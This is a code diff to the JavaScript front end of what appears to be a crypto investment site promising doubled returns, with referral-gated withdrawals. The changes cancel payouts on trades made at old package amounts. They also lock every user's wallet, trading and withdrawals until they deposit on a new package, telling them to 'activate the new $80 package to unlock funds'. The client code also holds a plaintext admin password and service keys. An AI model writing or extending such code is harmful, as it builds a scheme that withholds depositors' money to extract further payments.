@@ -250,6 +250,7 @@ var sb=supabase.createClient(SB_URL,SB_KEY);
 var ADMIN_ID="admin",ADMIN_PASS="Norvex@2026";
 var EJ_PUB="tjvq6nXPfo-Kcs_gR",EJ_SVC="service_e8rlj8i",EJ_TPL="template_iwl5w65";
 var pending=null,me=null,candles=[],px=68432.21,isAdmin=false;
+var NEWP=[80,250,500,1500,2500,6000,12000,22000];
 if(window.emailjs){try{emailjs.init({publicKey:EJ_PUB});}catch(e){}}
 function el(id){return document.getElementById(id);}
 function showScreen(n){["landing","signup","otp","login","adminlogin"].forEach(function(x){var e=el("screen-"+x);if(e)e.classList.toggle("hidden",x!==n);});}
@@ -327,7 +328,18 @@ drawUser();openTab("home");
 if(window._t)clearInterval(window._t);
 window._t=setInterval(function(){drawUser();},1000);
 }
-function planFor(amt){amt=Number(amt||0);if(amt>=10000)return{hours:720,label:"30 days"};if(amt>=5000)return{hours:600,label:"25 days"};if(amt>=1000)return{hours:480,label:"20 days"};if(amt>=500)return{hours:384,label:"16 days"};if(amt>=100)return{hours:288,label:"12 days"};if(amt>=50)return{hours:72,label:"72 hours"};return{hours:24,label:"24 hours"};}
+function planFor(amt){
+  amt=Number(amt)||0;
+  if(amt>=22000) return {amt:22000,hours:3600,label:"150 days"};
+  if(amt>=12000) return {amt:12000,hours:2160,label:"90 days"};
+  if(amt>=6000) return {amt:6000,hours:1200,label:"50 days"};
+  if(amt>=2500) return {amt:2500,hours:720,label:"30 days"};
+  if(amt>=1500) return {amt:1500,hours:528,label:"22 days"};
+  if(amt>=500) return {amt:500,hours:360,label:"15 days"};
+  if(amt>=250) return {amt:250,hours:192,label:"8 days"};
+  if(amt>=80) return {amt:80,hours:72,label:"72 hours"};
+  return {amt:0,hours:0,label:"—"};
+}
 function fmtLeft(ms){if(ms<=0)return"00:00:00";var s=Math.floor(ms/1000),d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60),sec=s%60,p=function(n){return String(n).padStart(2,"0");};return(d?d+"d ":"")+p(h)+":"+p(m)+":"+p(sec);}
 function refLink(){return location.origin+(location.pathname||"/")+"?ref="+encodeURIComponent(me&&me.ref_code?me.ref_code:"");}
 function copyRefLink(){navigator.clipboard.writeText(refLink());pop("Copied","");}
@@ -337,6 +349,10 @@ var t=await sb.from("trades").select("*").eq("user_id",me.id).eq("paid",false).m
 if(!t.data||!t.data.ends_at)return;
 if(Date.now()>=new Date(t.data.ends_at).getTime()){
 var inv=Number(t.data.amount)||0,twox=+(inv*2).toFixed(2);
+  if(NEWP.indexOf(inv)<0){
+    await sb.from("trades").update({paid:true}).eq("id",t.data.id);
+    return;
+  }
 await sb.from("trades").update({paid:true}).eq("id",t.data.id);
 await sb.from("profiles").update({balance:Number(me.balance||0)+twox,profit:Number(me.profit||0)+twox}).eq("id",me.id);
 await loadMe();
@@ -408,16 +424,17 @@ var bal=Number(me.balance||0);
 if(el("pkg-box"))el("pkg-box").innerHTML=packs.map(function(p){var pl=planFor(p);return '<div class="gold-border rounded-lg p-3 mb-2 flex justify-between"><span>$'+p+'</span><span class="text-nx-gold2">2x · '+pl.label+'</span></div>';}).join("");
 var q=await quota();
   if(el("quota-msg"))el("quota-msg").innerHTML="Package $"+q.pkg+" · Withdraws "+q.used+"/"+q.cap+" · Team "+q.team+(q.used>=q.cap?" · Limit reached. Next package required.":" · Left "+(q.cap-q.used));
-var wn=el("wd-notice");
-if(wn){
-if(q.dirNeed){
-  wn.classList.remove("hidden");
-wn.innerHTML='<div class="serif text-nx-gold text-sm mb-1">Pending withdrawal notice</div><div>This condition is only for this withdrawal.</div><div class="mt-2">Your package is <b class="text-nx-gold">$'+q.pkg+'</b>. Complete <b class="text-nx-gold">1 direct referral on the $'+q.needPkg+' package</b>. After that direct joining is approved, this notice will hide and withdraw will open.</div>';
-}else{
-wn.classList.add("hidden");
-wn.innerHTML="";
+  var wn=el("wd-notice");
+  if(wn){
+    var ok=await hasNewPkg();
+    if(!ok){
+      wn.classList.remove("hidden");
+      wn.innerHTML='<div class="serif text-nx-gold text-sm">Wallet locked. Activate the new $80 package to unlock funds and withdraw.</div>';
+    }else{
+      wn.classList.add("hidden");
+      wn.innerHTML="";
+    }
   }
-}
 }
 function openTab(id){["home","deposit","trade","profit","withdraw","team","guide"].forEach(function(t){var n=el("tab-"+t);if(n)n.classList.toggle("hidden",t!==id);});}
 async function submitHash(){
@@ -429,7 +446,14 @@ await sb.from("deposits").insert({user_id:me.id,amount:amt,hash:hash,status:"PEN
 el("dep-amt").value="";el("dep-hash").value="";
 popSpin();setTimeout(function(){pop("Successfully","");drawUser();},800);
 }
-function pkgOf(amt){var packs=[20,50,100,500,1000,5000,10000];var p=20;packs.forEach(function(x){if(Number(amt)>=x)p=x;});return p;}
+function pkgOf(amt){var packs=[80,250,500,1500,2500,6000,12000,22000];var n=Number(amt)||0,out=80;packs.forEach(function(p){if(n>=p)out=p;});return out;}
+async function hasNewPkg(){
+  if(!me) return false;
+  var d=await sb.from("deposits").select("amount,status").eq("user_id",me.id);
+  return (d.data||[]).some(function(x){
+    return String(x.status).toUpperCase()==="APPROVED" && NEWP.indexOf(Number(x.amount))>=0;
+  });
+}
 function baseCap(pkg){if(pkg>=10000)return 8;if(pkg>=5000)return 5;if(pkg>=1000)return 4;if(pkg>=500)return 3;return 2;}
 function extraNeed(pkg){if(pkg<=20)return{n:2,min:20,txt:"2 Direct $20"};if(pkg<=50)return{n:8,min:20,txt:"8 Direct $20+"};if(pkg<=100)return{n:20,min:20,txt:"20 Direct"};if(pkg<=500)return{n:10,min:100,txt:"10 Direct $100"};if(pkg<=1000)return{n:25,min:100,txt:"25 Direct $100"};if(pkg<=5000)return{n:50,min:100,txt:"50 Direct $100"};return{n:100,min:100,txt:"100 Direct $100"};}
 async function quota(){
@@ -457,13 +481,14 @@ var cap=2+extra;
 var wds=await sb.from("withdrawals").select("id,status").eq("user_id",me.id);
 var used=(wds.data||[]).filter(function(x){return String(x.status||"").toUpperCase()!="REJECTED";}).length;
 var needPkg=0;
-if(pkg===20)needPkg=20;
-else if(pkg<=50)needPkg=50;
+if(pkg===80)needPkg=80;
+else if(pkg<=250)needPkg=250;
 var dirMatch=dirs.filter(function(x){return startOf(x.u.id)>=needPkg;}).length;
 return {cap:cap,used:used,team:nTeam,pkg:pkg,needPkg:needPkg,dirMatch:dirMatch,dirNeed:(needPkg>0&&dirMatch<1)};
 }
 async function startTrade(){
 if(!me)return;
+  if(!(await hasNewPkg())){pop("Locked","Activate $80 package first. Old wallet stays locked until $80 recharge.");return}
 var open=await sb.from("trades").select("id").eq("user_id",me.id).eq("paid",false).maybeSingle();
 if(open.data){pop("Trade","Already running");return;}
 var packs=[20,50,100,500,1000,5000,10000];
@@ -486,10 +511,7 @@ await loadMe();drawUser();pop("Saved","");
 }
 async function requestWd(){
 if(!me)return;
-  var q=await quota();
-if(q.used>=q.cap){pop("Notice","Package $"+q.pkg+" extra withdraw needs "+q.need+".");return;}
-if(!me.wd_address){pop("Error","Add address");return;}
-  if(q.dirNeed){pop("Notice","This condition is only for this withdrawal. Complete 1 direct $"+q.needPkg+" referral first. Package $"+q.pkg+".");return;}
+    if(!(await hasNewPkg())){pop("Locked","Activate $80 package to unlock wallet and withdraw.");return}
 var amt=Number(el("wd-amt").value);
 if(!amt||amt>Number(me.balance||0)){pop("Error","Check amount");return;}
 
